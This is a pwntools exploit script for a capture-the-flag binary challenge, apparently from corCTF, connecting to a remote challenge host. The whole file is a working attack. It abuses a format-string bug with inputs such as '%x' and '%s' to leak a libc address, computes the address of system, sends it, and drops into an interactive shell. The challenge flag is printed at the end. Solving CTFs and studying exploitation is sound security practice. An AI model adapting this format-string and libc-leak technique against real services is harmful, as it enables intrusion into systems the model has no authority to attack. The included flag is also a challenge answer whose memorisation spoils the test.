#!/usr/bin/python3

from pwn import *

exe = ELF('chal_patched', checksec=False)
libc = ELF("libc.so.6")
context.binary = exe


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)
def sln(msg, num): return sla(msg, str(num).encode())
def sn(msg, num): return sa(msg, str(num).encode())


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        brva 0x1247

        c
        ''')
        input()


if args.REMOTE:
    p = remote('be.ax', 32323)
else:
    p = process(exe.path)

while True:
    sla(b"call", b'1')
    sl("%x")
    p.recvuntil(b'Here: ')
    tmp = int(b"0x"+p.recvuntil(b"1.", drop=True), 16)
    if tmp < 0x8000000 and tmp > 0:
        
        info("tmp: " + hex(tmp))
    # input()
        sa(b"call", b'1')
        sl(b"%*s")
        GDB()
        sa(b"call", b'1')
        sl(b"%s")
        libc.address = u64(p.recvuntil(b"1.", drop=True)[-6:] + b"\0\0") - 0x1ec980
        info("leak: " + hex(libc.address))
        sla(b"call", b'2')
        # input()
        info("leak: " + hex(libc.sym.system))
        sl(hex(libc.sym.system))
        p.interactive()
    else:
        p.close()
        p = process(exe.path)

# 0x1ec980
# corctf{w4CKy_$tr1NG-f0rm4T!}